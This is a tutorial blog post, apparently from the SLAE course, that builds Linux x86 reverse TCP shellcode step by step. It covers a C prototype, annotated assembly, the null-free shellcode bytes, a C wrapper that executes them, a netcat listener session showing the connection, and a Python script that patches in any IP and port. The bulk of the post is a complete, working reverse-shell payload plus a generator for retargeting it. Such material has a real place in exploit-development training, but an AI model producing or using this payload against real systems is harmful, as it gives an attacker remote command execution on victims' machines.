---
layout: post
title: SLAE 2 - Shell Reverse TCP Shellcode
date:   2019-03-07
categories: [SLAE, Assembly]
---
## Creating Shell Reverse TCP Shellcode

The proper steps for a Bind Shell are as follows:
1. Creating the socket
2. Connect to an IP and port
3. Redirect output
4. Execute a shell

#### In order to easily translate the calls in to assembly, lets build the Bind Shell in C first.  Then we will be able to translate it from there.

## Creating a Reverse Shell in C

We covered most of these details in the Shell Bind TCP Shellcode write up so I'm just going to put the C code in with light comments.

```c
#import <sys/socket.h>
#import <sys/types.h>
#import <netinet/in.h>
#import <stdlib.h>

int main() {
        int sockfd = socket(AF_INET, SOCK_STREAM, 0);
        
        struct sockaddr_in sock_addr;
        
        sock_addr.sin_family = AF_INET;
        sock_addr.sin_port = htons(4444);
        sock_addr.sin_addr.s_addr = inet_addr("127.1.1.1");
        
        // int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
        int connection = connect(sockfd, (struct sockaddr *)&sock_addr, sizeof(sock_addr));
        
        dup2(connection, 0);
        dup2(connection, 1);
        dup2(connection, 2);
        
        execve("/bin/sh", NULL, NULL);
}
```
## Translating to Assembly

Most of this is a repeat of the Bind Shell so there will be a lot of the same details.

The steps are the same as mentioned above:
1. [Creating the socket](#creating-the-socket)
2. [Connect to an IP and port](#connect-to-an-ip-and-port)
3. [Redirect output](#redirect-output)
4. [Execute a shell](#execute-a-shell)
5. [Putting it all together](#putting-it-all-together)

A quick reminder of arguments and calls for assembly:
- EAX is used for the syscall number. As with a lot of calls, EAX will store the return value.
  * Syscall numbers can be found in /usr/include/i386-linux-gnu/asm/unistd_32.h
- EBX is used for the first argument to be passed
- ECX is used for the second argument to be passed
- EDX is used for the third argument to be passed
- ESI is used for the fourth argument to be passed
- EDI is used for the fifth argument to be passed
- Any structs can be made by using the stack and pointing to it's address

### Creating the socket

Sockets are handled through socketcall()\
http://man7.org/linux/man-pages/man2/socketcall.2.html
```c
int socketcall(int call, unsigned long *args);
```
The call ids can be found at:
```c 
cat /usr/include/linux/net.h | grep SYS_

#define SYS_SOCKET	 1		/* sys_socket(2)		*/
#define SYS_BIND	   2		/* sys_bind(2)			*/
#define SYS_CONNECT	3		/* sys_connect(2)		*/
#define SYS_LISTEN	 4		/* sys_listen(2)		*/
#define SYS_ACCEPT	 5		/* sys_accept(2)		*/
``` 
Looking at our C code, we need to call socket(2, 1, 0);\
This will translate to:\
    EAX - 0x66 for socketcall\
    EBX - 1 fo socket\
    ECX - address on stack with args 2, 1 0\
```asm
; clear registers while avoiding nulls
xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx

; 0x66 for socketcall
mov al, 0x66
;0x1 for socket
mov bl, 0x1
```
Setting up ECX - our *args parameter - we can use the stack to push the values then make ecx the stack pointer so that we have the address for the args.  Note that when using the stack for args in this way, we have to push them in the reverse order due to the way the stack works (FILO).
```asm
; ecx = 0
push ecx
; ebx = 1
push ebx        
push 0x2

; point ecx to the stack for args
mov ecx, esp
int 0x80
```
Return value will be sockfd stored in EAX.  Since EAX is used for our socketcall argument, we need to move it to a register for safe keeping which will be edi.
```asm
mov edi, eax
```
### Connect to an IP and port
Now that we have the sockfd, it's time to connect the socket to an IP and port.\
\
As we created earlier, our reference is:\
int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
Just for my own understanding, I'll write out the socketcall format with any structs or objects in {}.\
socketcall( SYS_CONNECT, {sockfd, {AF_INET, 4444, [IP]}, 0x10} );\
EAX - 0x66\
EBX - 0x3\
ECX - pointing to stack:\
STACK: edi, point to struct, 0x10, struct{0x2, 0x115C, 0x83f7a8c0}\
\
Lets build this in assembly now:
```asm
mov al, 0x66
inc ebx      ; previously set to 0x1 -> increase it to 2

; push struct to stack
push 0x83f7a8c0       ; ip: aton(192.168.247.131) - 0x83f7a8c0
push word 0x5C11           ; port: htons(4444) - 0x5C11
push bx               ; AF_INET = 2

;store reference to struct
mov ecx, esp

; push bind args
push 0x10      ; sizeof(sock_addr) = 0x10
push ecx       ; struct sock_addr
push edi       ; sockfd

mov ecx, esp
int 0x80
```
### Redirect output
Now that we have accepted the connection, we need to redirect in, out, & err.
The return value for accept is the descriptor for the client connection, which will be used as an argument for dup2 in ebx.  We can just move this from eax to ebx first.\
dup2(client_socket, 0);\
dup2(client_socket, 1);\
dup2(client_socket, 2);\
This translates to:\
EAX - 0x3f\
EBX - return value from accept\
ECX - integer 2, 1, or 0
Since this is the same call 3 times and the only difference is an increasing (*hint* or decreasing) int.. this looks like a loop would be best to use here.\
Luckily, our loop only needs to decrease from 2.  ECX can be used as the counter AND the argument, which helps us out a lot here.

Grab the syscall number for dup2:
```c
cat /usr/
```
There is a conditional jump in assembly called jns which means, as I understand it, "Jump No Sign".  Which will take the jump until the Sign Flag is set.  Easier description.. Take the jump until the value becomes negative.\
This conditional jump is perfect for us because it will include 0 in our loop before exiting.
```asm
        mov ebx, eax    ; client_socket arg
        xor ecx, ecx    ; zero ecx avoiding nulls
        mov cl, 0x2     ; setup counter
dup:
        mov al, 0x3f
        int 0x80        ; dup2(client_socket, [ecx])
        dec ecx
        jns dup
```
### Execute a shell
Now we just need to execute /bin/sh with execve to give the client the shell.\
The call will be:\
execve("/bin/sh", NULL, NULL);\
We have to null terminate the string for "/bin/sh" so we will use the stack to assign it to the proper register.\
EDX is still 0'd out so we can keep it the same and also use it to make ECX 0.
Note that, for ease of writing, we want 8 characters for our string.  We can do "/bin//sh" to effectively give the same command and have the proper length.  We also want to reverse the string, split it in to 4 character sections and push it on to the stack in hex.
```asm
push edx  ; null terminate the string
push 0x68732f2f ; push hs//
push 0x6e69622f ; push nib/

mov ebx, esp    ; move null terminated string into register

mov ecx, edx    ; 0x0
mov al, 0xB     ; syscall execve
int0x80         ; execve("/bin/sh", NULL, NULL);
```
### Putting It All Together
The final product is:
```asm
global _start

section .text

_start:
	
	; clear registers
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx


	;***************;
	; create socket ;
	;***************;


	; 0x66 for socketcall
	mov al, 0x66

	;0x1 for socket
	mov bl, 0x1
	

	push ecx	; 0x0
	push ebx	; 0x1 SOCK_STREAM

	push 0x2	; AF_INET

	; point ecx to the stack for args
	mov ecx, esp
	int 0x80	; socketcall(SYS_SOCKET, {AF_INET, SOCK_STREAM, 0})

	; keep sockfd for later
	mov edi, eax


	;************************;
	; connect to ip and port ;
	;************************;


	; 0x66 for socketcall
	mov al, 0x66

	inc ebx
	
	; push struct to stack
	push 0x83f7a8c0		; ip: aton(192.168.247.131)

	push word 0x5C11	; port: htons(4444) - 0x5C11
	push bx			; AF_INET - 0x2

	inc ebx			; 0x3 SYS_CONNECT

	; store reference to struct
	mov ecx, esp

	; push connect args
	push 0x10	; size of struct
	push ecx	; struct sock_addr
	push edi	; sockfd

	mov ecx, esp
	int 0x80	; socketcall(SYS_CONNECT, {sockfd, sock_addr, addrlen})


	;******************;
	; redirect outputs ;
	;******************;


	mov ebx, edi	; sockfd arg
	xor ecx, ecx
	mov cl, 0x2	; set up counter

dup:
	mov al, 0x3f	; dup2
	int 0x80	; dup2(sockfd, [cl])
	dec ecx
	jns dup
	

	;*****************;
	; execute a shell ;
	;*****************;


	push edx	; null terminate the string
	push 0x68732f2f	; push hs//
	push 0x6e69622f	; push nib/

	mov ebx, esp	; move null terminated string into register

	mov ecx, edx	; 0x0
	mov al, 0xB	; syscall - execve
	int 0x80	; execve("/bin//sh", NULL, NULL)
```
Compile it:
```shell
./compile.sh reverse_shell
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
```
Check for null bytes:
```shell
objdump -d reverse_shell -M intel

reverse_shell:     file format elf32-i386


Disassembly of section .text:

08048080 <_start>:
 8048080:	31 c0                	xor    eax,eax
 8048082:	31 db                	xor    ebx,ebx
 8048084:	31 c9                	xor    ecx,ecx
 8048086:	31 d2                	xor    edx,edx
 8048088:	b0 66                	mov    al,0x66
 804808a:	b3 01                	mov    bl,0x1
 804808c:	51                   	push   ecx
 804808d:	53                   	push   ebx
 804808e:	6a 02                	push   0x2
 8048090:	89 e1                	mov    ecx,esp
 8048092:	cd 80                	int    0x80
 8048094:	89 c7                	mov    edi,eax
 8048096:	b0 66                	mov    al,0x66
 8048098:	43                   	inc    ebx
 8048099:	68 c0 a8 f7 83       	push   0x83f7a8c0
 804809e:	66 68 11 5c          	pushw  0x5c11
 80480a2:	66 53                	push   bx
 80480a4:	43                   	inc    ebx
 80480a5:	89 e1                	mov    ecx,esp
 80480a7:	6a 10                	push   0x10
 80480a9:	51                   	push   ecx
 80480aa:	57                   	push   edi
 80480ab:	89 e1                	mov    ecx,esp
 80480ad:	cd 80                	int    0x80
 80480af:	89 fb                	mov    ebx,edi
 80480b1:	31 c9                	xor    ecx,ecx
 80480b3:	b1 02                	mov    cl,0x2

080480b5 <dup>:
 80480b5:	b0 3f                	mov    al,0x3f
 80480b7:	cd 80                	int    0x80
 80480b9:	49                   	dec    ecx
 80480ba:	79 f9                	jns    80480b5 <dup>
 80480bc:	52                   	push   edx
 80480bd:	68 2f 2f 73 68       	push   0x68732f2f
 80480c2:	68 2f 62 69 6e       	push   0x6e69622f
 80480c7:	89 e3                	mov    ebx,esp
 80480c9:	89 d1                	mov    ecx,edx
 80480cb:	b0 0b                	mov    al,0xb
 80480cd:	cd 80                	int    0x80
 ```
 No null bytes so we are good keep moving forward.
 
 Extract bytes:
 ```shell
 objdump -d ./reverse_shell|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc7\xb0\x66\x43\x68\xc0\xa8\xf7\x83\x66\x68\x11\x5c\x66\x53\x43\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x89\xfb\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xb0\x0b\xcd\x80"
 ```
 Put it into our shellcode wrapper:
 ```c
 #include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc7\xb0\x66\x43\x68\xc0\xa8\xf7\x83\x66\x68\x11\x5c\x66\x53\x43\x89\xe1\x6a\x10\x51\x57\x89$

main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}
 ```
 Compile:
 ```shell
 gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
 ```
 Now it should be good to run! Start your listener, then run your reverse_shell:
 ```shell
 ./shellcode
Shellcode Length:  79
 ```
 Listen for connection and issue command:
 ```shell
 nc -lvp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [192.168.247.131] port 4444 [tcp/*] accepted (family 2, sport 45306)
who
pwoer    tty7         Dec 11 10:13 (:0)
 ```

Now we will make a python script to replace the IP and port numbers so that we have easily created shellcode!  This will just replace the IP and port within the shellcode and output the new version.
```python
import struct
import sys
import socket
import binascii

def main():
	if len(sys.argv) != 3:
		print "Usage: {0} IP PORT".format(sys.argv[0])
		exit()

	ip = sys.argv[1]
	
	port = int(sys.argv[2])
	# bounds checking
	if not (0 <= port <= 65535):
		print "That's not a real port number!"
		exit()

	# check well known ports
	if port <= 1024:
		print "Reminder: Well known port needs to be run as root"
	
	ip = socket.inet_aton(ip)	
	ip = binascii.hexlify(ip)
	ip = '\\x'+ip[0:2]+'\\x'+ ip[2:4] + '\\x' + ip[4:6] + '\\x' + ip[6:]

	port = r'\x' + r'\x'.join(x.encode('hex') for x in struct.pack('!H', port))	

	# check nulls
	if r'\x00' in ip:
		print 'Null in that ip. Try again.'
		exit()
	if r'\x00' in port:
		print 'Null in that port number. Try again.'
		exit()

	shellcode = "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xb0\\x66\\xb3\\x01\\x51\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc7\\xb0\\x66\\x43\\x68" + ip + "\\x66\\x68" + port + "\\x66\\x53\\x43\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xcd\\x80\\x89\\xfb\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xd1\\xb0\\x0b\\xcd\\x80"


	print "Shellcode: " + shellcode
	
if __name__=="__main__":
	main()
```
